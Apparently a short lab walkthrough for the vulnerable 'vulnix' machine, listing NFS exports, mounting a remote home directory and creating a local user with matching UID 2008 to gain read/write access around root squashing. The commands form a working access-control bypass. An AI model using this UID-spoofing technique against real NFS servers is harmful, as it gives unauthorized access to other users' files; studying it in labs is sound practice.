Show NFS server mount information

showmount --exports 192.168.1.33

Mounting remote export

mkdir /tmp/nfs
mount -t nfs 192.168.1.33:/home/vulnix /tmp/nfs

If we don't have permission to access /tmp/nfs then root squashing is enabled

In order to RW into the mounted export we need to find out original exported dir owner UID and GID
and create such user on our system.

Original user from /etc/passwd

vulnix:x:2008:2008::/home/vulnix:/bin/bash

Creating original user clone on our machine and log into the export

useradd -u 2008 vulnix
su vulnix
cd /tmp/nfs
